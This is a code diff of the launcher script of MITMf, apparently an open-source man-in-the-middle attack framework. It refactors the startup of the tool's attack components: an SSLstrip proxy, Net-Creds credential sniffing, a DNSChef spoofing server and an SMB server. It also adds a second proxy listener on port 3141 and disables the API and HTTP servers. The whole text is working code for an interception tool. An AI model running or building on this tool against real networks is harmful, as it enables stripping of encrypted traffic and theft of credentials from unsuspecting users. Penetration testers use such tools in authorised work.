@@ -22,13 +22,12 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Gets rid of IPV6 Error when importing scapy
 logging.getLogger("requests").setLevel(logging.WARNING) #Disables "Starting new HTTP Connection (1)" log message
 logging.getLogger("mitmflib.watchdog").setLevel(logging.ERROR) #Disables watchdog's debug messages
-logging.getLogger('mitmflib.smbserver').setLevel(logging.INFO)
-logging.getLogger('mitmflib.impacket').setLevel(logging.INFO)
 
 import argparse
 import sys
 import os
 import threading
+import core.responder.settings as settings
 
 from twisted.web import http
 from twisted.internet import reactor
@@ -46,7 +45,7 @@ if os.geteuid() != 0:
 
 parser = argparse.ArgumentParser(description="MITMf v{} - '{}'".format(mitmf_version, mitmf_codename), 
                                  version="{} - '{}'".format(mitmf_version, mitmf_codename), 
-                                 usage='mitmf.py [-i interface] [mitmf options] [plugin name] [plugin options]', 
+                                 usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', 
                                  epilog="Use wisely, young Padawan.")
 
 #add MITMf options
@@ -73,14 +72,14 @@ options = parser.parse_args()
 logger().log_level = logging.__dict__[options.log_level.upper()]
 
 #Check to see if we supplied a valid interface, pass the IP and MAC to the NameSpace object
-from core.utils import get_iface, get_ip, get_mac, shutdown
-if not options.interface:
-    options.interface = get_iface()
+from core.utils import get_ip, get_mac, shutdown
 options.ip  = get_ip(options.interface)
 options.mac = get_mac(options.interface)
 
+settings.Config.populate(options)
+
 from core.sslstrip.CookieCleaner import CookieCleaner
-from core.sergioproxy.ProxyPlugins import ProxyPlugins
+from core.proxyplugins import ProxyPlugins
 from core.sslstrip.StrippingProxy import StrippingProxy
 from core.sslstrip.URLMonitor import URLMonitor
 
@@ -92,6 +91,7 @@ strippingFactory          = http.HTTPFactory(timeout=10)
 strippingFactory.protocol = StrippingProxy
 
 reactor.listenTCP(options.listen_port, strippingFactory)
+reactor.listenTCP(3141, strippingFactory)
 
 ProxyPlugins().all_plugins = plugins
 
@@ -124,42 +124,42 @@ print "|_ SSLstrip v0.9 by Moxie Marlinspike online"
 print "|"
 
 if options.filter:
-    from core.packetparser import PacketParser
-    pparser = PacketParser(options.filter)
-    pparser.start()
-    print "|_ PacketParser online"
+    from core.packetfilter import PacketFilter
+    pfilter = PacketFilter(options.filter)
+    pfilter.start()
+    print "|_ PacketFilter online"
     print "|  |_ Applying filter {} to incoming packets".format(options.filter)
 
 #Start mitmf-api
-from core.mitmfapi import mitmfapi
-print "|_ MITMf-API online"
-mitmfapi().start()
+#from core.mitmfapi import mitmfapi
+#print "|_ MITMf-API online"
+#mitmfapi().start()
 
 #Start Net-Creds
-from core.netcreds.NetCreds import NetCreds
+from core.netcreds import NetCreds
 NetCreds().start(options.interface, options.ip)
 print "|_ Net-Creds v{} online".format(NetCreds.version)
 
 #Start the HTTP Server
-from core.servers.http.HTTPserver import HTTPserver
-HTTPserver().start()
-print "|_ HTTP server online"
+#from core.servers.HTTP import HTTP
+#HTTPserver().start()
+#print "|_ HTTP server online"
 
 #Start DNSChef
-from core.servers.dns.DNSchef import DNSChef
+from core.servers.DNS import DNSChef
 DNSChef().start()
 print "|_ DNSChef v{} online".format(DNSChef.version)
 
 #Start the SMB server
-from core.servers.smb.SMBserver import SMBserver
-SMBserver().start()
-print "|_ SMB server online [Mode: {}] (Impacket {}) \n".format(SMBserver().mode, SMBserver().version)
+from core.servers.SMB import SMB
+SMB().start()
+print "|_ SMB server online\n"
 
 #start the reactor
 reactor.run()
 print "\n"
 
 if options.filter:
-    pparser.stop()
+    pfilter.stop()
 
 shutdown()
